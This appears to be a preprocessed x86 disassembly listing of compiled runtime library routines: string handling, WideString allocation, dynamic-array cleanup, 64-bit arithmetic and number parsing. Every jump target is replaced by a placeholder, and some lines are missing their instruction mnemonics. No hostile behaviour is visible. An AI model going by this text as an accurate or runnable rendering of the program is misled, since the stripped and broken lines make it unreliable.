mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4028fc
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_404a68
mov edi ecx
sub_4049c4
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_404a68
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_4028fc
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4028fc
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_404a20
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_404a68
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_40442c
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_4044f0
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_402784
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4028fc
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_404acc
push ebx
mov ebx edx
mov edx ecx
xor ecx ecx
test ebx ebx
je r-xdata
push ecx
call sub_403148
pop ecx
mov edx ebx
pop ebx
jmp sub_4030f4
mov ecx [ ebx - 0x4 ]
sub edx ecx
sub_404b34
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call SysFreeString
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_404b58
test edx edx
je sub_404b1c
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_404b1c
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_4028a0
retn
sub_404b7c
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_404b1c
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_404dc4
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404568
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_404568
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404dc4
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404c08
jmp r-xdata
sub_404c08
test ecx ecx
je sub_404b1c
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_4028a0
pop edx
push [ edx ]
mov [ edx ] eax
call SysFreeString
retn
sub_404c2c
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404c08
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404c94
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov [ esp ] eax
mov eax ebp
call sub_404c88
mov ebx eax
test ebx ebx
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov eax [ eax ]
call sub_404c88
mov esi eax
lea eax [ ebx + esi ]
call sub_404af4
mov edi eax
test esi esi
jle r-xdata
mov ecx ebx
add ecx ecx
lea edx [ edi + esi * 2 ]
mov eax ebp
call sub_4028fc
mov eax [ esp ]
mov edx edi
call sub_404b0c
mov ecx esi
add ecx ecx
mov edx edi
mov eax [ esp ]
mov eax [ eax ]
call sub_4028fc
sub_404cf4
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_404d78
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_404c88
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_404c08
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_404dc4
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_404b0c
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_404af4
mov ebx eax
mov eax [ edi ]
call sub_404c88
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_4028fc
mov eax esi
sub_404e08
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404e38
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_404e38
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404e38
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404e08
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_4028a0
sub_404ed8
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404f0c
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_404f0c
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_404450
jmp r-xdata
call sub_40442c
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_404b34
jmp r-xdata
call sub_404b1c
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_4053ac
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404f0c
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404ed8
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_406194
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_405ab4
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_4028a0
sub_405004
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4028fc
mov edx [ eax + esi ]
add eax ebx
call sub_404480
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_404b58
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_4052fc
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4028fc
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_405120
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_405004
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4061ac
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_405af0
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_4028a0
sub_405120
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_404480
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_404b58
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_4052fc
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_405120
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_405004
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4061ac
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_405af0
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_4028a0
sub_405244
push ebx
push esi
push 0x0
mov esi edx
mov ebx eax
mov [ esp ] ebx
mov eax [ esp ]
call sub_404c88
mov edx eax
mov ecx esi
mov eax ebx
call sub_405238
pop edx
pop esi
pop ebx
retn
sub_405268
push ebx
push ecx
mov ebx eax
xor eax eax
mov [ esp ] eax
mov eax ebx
call sub_4046e4
mov ecx eax
mov eax esp
mov edx ebx
call sub_404b7c
mov eax [ esp ]
pop edx
pop ebx
retn
sub_4053bc
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_4053e0
push ebp
push ebx
push esi
push edi
xor edi edi
mov ebx [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
or ecx ecx
jne r-xdata
or edx edx
jns r-xdata
or edx edx
je r-xdata
or ecx ecx
jns r-xdata
neg edx
neg eax
sbb edx 0x0
or edi 0x1
div ebx
xor edx edx
jmp r-xdata
or ebx ebx
je r-xdata
mov ebp ecx
mov ecx 0x40
push edi
xor edi edi
xor esi esi
neg ecx
neg ebx
sbb ecx 0x0
xor edi 0x1
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
loop r-xdata
ja r-xdata
shl eax 0x1
rcl edx 0x1
rcl esi 0x1
rcl edi 0x1
cmp edi ebp
jb r-xdata
pop ebx
test ebx 0x1
je r-xdata
sub esi ebx
sbb edi ebp
inc eax
cmp esi ebx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
sub_40545c
push ebp
push ebx
push esi
push edi
mov ebx [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
or ecx ecx
jne r-xdata
mov ebp ecx
mov ecx 0x40
xor edi edi
xor esi esi
or edx edx
je r-xdata
loop r-xdata
ja r-xdata
div ebx
xor edx edx
jmp r-xdata
or ebx ebx
je r-xdata
shl eax 0x1
rcl edx 0x1
rcl esi 0x1
rcl edi 0x1
cmp edi ebp
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub esi ebx
sbb edi ebp
inc eax
cmp esi ebx
jb r-xdata
sub_4054a8
push ebp
push ebx
push esi
push edi
xor edi edi
mov ebx [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
or ecx ecx
jne r-xdata
or edx edx
jns r-xdata
or edx edx
je r-xdata
or ecx ecx
jns r-xdata
neg edx
neg eax
sbb edx 0x0
or edi 0x1
div ebx
xchg edx eax
xor edx edx
jmp r-xdata
or ebx ebx
je r-xdata
mov ebp ecx
mov ecx 0x40
push edi
xor edi edi
xor esi esi
neg ecx
neg ebx
sbb ecx 0x0
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
loop r-xdata
ja r-xdata
shl eax 0x1
rcl edx 0x1
rcl esi 0x1
rcl edi 0x1
cmp edi ebp
jb r-xdata
mov eax esi
mov edx edi
pop ebx
test ebx 0x1
je r-xdata
sub esi ebx
sbb edi ebp
inc eax
cmp esi ebx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
sub_405524
push ebp
push ebx
push esi
push edi
mov ebx [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
or ecx ecx
jne r-xdata
mov ebp ecx
mov ecx 0x40
xor edi edi
xor esi esi
or edx edx
je r-xdata
loop r-xdata
ja r-xdata
div ebx
xchg edx eax
xor edx edx
jmp r-xdata
or ebx ebx
je r-xdata
shl eax 0x1
rcl edx 0x1
rcl esi 0x1
rcl edi 0x1
cmp edi ebp
jb r-xdata
mov eax esi
mov edx edi
sub esi ebx
sbb edi ebp
inc eax
cmp esi ebx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_405574
cmp cl 0x20
jl r-xdata
shld edx eax cl
shl eax cl
retn
cmp cl 0x40
jl r-xdata
mov edx eax
shl edx cl
xor eax eax
retn
xor edx edx
xor eax eax
retn
sub_405594
cmp cl 0x20
jl r-xdata
shrd eax edx cl
shr edx cl
retn
cmp cl 0x40
jl r-xdata
mov eax edx
xor edx edx
shr eax cl
retn
xor edx edx
xor eax eax
retn
sub_4055b4
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] edx
mov esi eax
mov ebp 0x1
xor edi edi
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xc ] 0x0
test esi esi
jne r-xdata
cmp [ esi + ebp - 0x1 ] 0x20
je r-xdata
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
inc ebp
mov [ esp + 0x10 ] 0x0
mov al [ esi + ebp - 0x1 ]
cmp al 0x2d
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
cmp al 0x2b
jne r-xdata
mov [ esp + 0x10 ] 0x1
inc ebp
jmp r-xdata
mov bl 0x1
cmp [ esi + ebp - 0x1 ] 0x24
je r-xdata
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
inc ebp
inc ebp
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jae r-xdata
mov al [ esi + ebp ]
call sub_402a88
cmp al 0x58
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
jmp r-xdata
add dl 0xf9
sub dl 0x6
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
cmp [ esp + 0xc ] 0x0
jne r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x37
jmp r-xdata
add dl 0xe6
sub dl 0x6
jb r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
mov edi eax
and edi 0xff
sub edi 0x57
jmp r-xdata
je r-xdata
cmp [ esp + 0x8 ] 0x0
cmp [ esp + 0xc ] 0xccccccc
jne r-xdata
jmp r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
cmp [ esp + 0xc ] 0x7ffffff
jne r-xdata
jmp r-xdata
cmp [ esi + ebp - 0x1 ] 0x0
setne al
or bl al
je r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xcccccccc
jbe r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jmp r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xffffffff
jbe r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
setl al
cmp [ esp + 0x8 ] 0x0
setb al
jmp r-xdata
push 0x0
push 0xa
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
call sub_4053bc
push edx
push eax
mov eax edi
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
mov eax edi
cdq
push edx
push eax
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
shld edx eax 0x4
shl eax 0x4
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
dec ebp
cmp al [ esp + 0x10 ]
je r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jb r-xdata
sub_405808
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405800
jmp r-xdata
mov al 0x4
call sub_4028a0
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_4028a0
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_402784
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_402744
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402fc4
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_404f0c
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4028fc
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402fc4
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_4057e8
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_405808
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_4059a0
push ebx
test eax eax
je r-xdata
mov eax ecx
call sub_405ab4
pop ebx
retn
mov ebx eax
sub ebx 0x4
mov ebx [ ebx ]
push ebx
push ecx
xor ecx ecx
call sub_4059c0
pop ebx
retn
sub_4059c0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_405800
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
test edi edi
jge r-xdata
mov eax [ ebp - 0x4 ]
sub eax 0x4
mov eax [ eax ]
cmp eax edi
jge r-xdata
add esi edi
xor edi edi
mov edx eax
sub edx edi
cmp esi edx
jle r-xdata
mov edi eax
test esi esi
jge r-xdata
mov esi edx
test esi esi
jle r-xdata
xor esi esi
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x1 ]
add [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x2 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x6 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax esi
imul [ ebp - 0xc ]
add eax 0x8
call sub_402744
mov ebx eax
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] esi
add ebx 0x4
imul edi [ ebp - 0xc ]
add [ ebp - 0x4 ] edi
test esi esi
jle r-xdata
mov ecx esi
imul ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4028fc
mov edx esi
imul edx [ ebp - 0xc ]
mov eax ebx
xor ecx ecx
call sub_402fc4
push esi
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4057e8
jmp r-xdata
sub_405ab4
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_402764
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_404f0c
sub_405af0
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_405ab4
pop edx
pop eax
sub_405b18
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_401368
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_405b48
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_4012f8
mov eax esp
mov dl 0x1
call sub_405d84
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
